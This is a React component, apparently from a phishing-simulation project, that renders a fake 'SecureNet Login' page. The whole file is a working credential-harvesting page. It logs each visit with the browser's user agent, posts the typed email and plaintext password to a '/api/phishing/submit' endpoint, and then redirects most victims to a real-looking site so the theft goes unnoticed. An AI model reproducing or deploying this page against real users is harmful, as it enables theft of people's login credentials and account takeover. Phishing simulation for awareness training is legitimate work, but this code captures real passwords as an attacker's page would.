import React, { useState, useEffect } from 'react';
import axios from 'axios';

const PhishingForms = () => {
  const [password, setPassword] = useState('');
  const [email, setEmail] = useState('');

  useEffect(() => {
    const user_agent = navigator.userAgent;
    const ip_address = '0.0.0.0';

    axios.post('http://localhost:5000/api/phishing/click', {
      user_agent,
      ip_address
    }).catch(err => {
      console.error('Click logging failed:', err);
    });
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // Send login request to backend
      const res = await axios.post('http://localhost:5000/api/phishing/submit', {
        email: email,
        password
      });

      console.log(res);

      // If backend returns user info and role, store in localStorage
      if (res.data && res.data.user && res.data.user.role) {
        localStorage.setItem('user', JSON.stringify({
          email: res.data.user.email,
          role: res.data.user.role
        }));
        // Optionally redirect admin to dashboard
        if (res.data.user.role === 'admin') {
          alert('Login successful!');
          window.location.href = '/dashboard'; // Adjust route as needed
        }
        else {
          window.location.href = 'https://securenet.jhubafrica.com';
        }
      } else {
        alert('Submitted successfully!');
      }

      setPassword('');
      setEmail('');
    } catch (err) {
      console.error('No response from server:', err);
      alert('Login failed!');
    }
  };

  return (
    <div style={styles.container}>
      <form onSubmit={handleSubmit} style={styles.form}>
        <h2 style={styles.title}>🔐 SecureNet Login</h2>

        <input
          style={styles.input}
          type="email"
          placeholder="Email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />

        <input
          style={styles.input}
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          
        />

        <button type="submit" style={styles.button}>Login</button>
      </form>
    </div>
  );
};

const styles = {
  container: {
    display: 'flex',
    justifyContent: 'center',
    padding: '3rem',
    backgroundColor: '#f0f4f8',
    minHeight: '100vh'
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
    padding: '2rem',
    borderRadius: '10px',
    backgroundColor: '#fff',
    boxShadow: '0 0 10px rgba(0,0,0,0.1)',
    width: '100%',
    maxWidth: '400px'
  },
  title: {
    textAlign: 'center',
    marginBottom: '1.5rem',
    color: '#333'
  },
  input: {
    padding: '0.75rem',
    marginBottom: '1rem',
    borderRadius: '5px',
    border: '1px solid #ccc',
    fontSize: '1rem'
  },
  button: {
    padding: '0.75rem',
    backgroundColor: '#007bff',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    fontSize: '1rem',
    cursor: 'pointer'
  }
};

export default PhishingForms;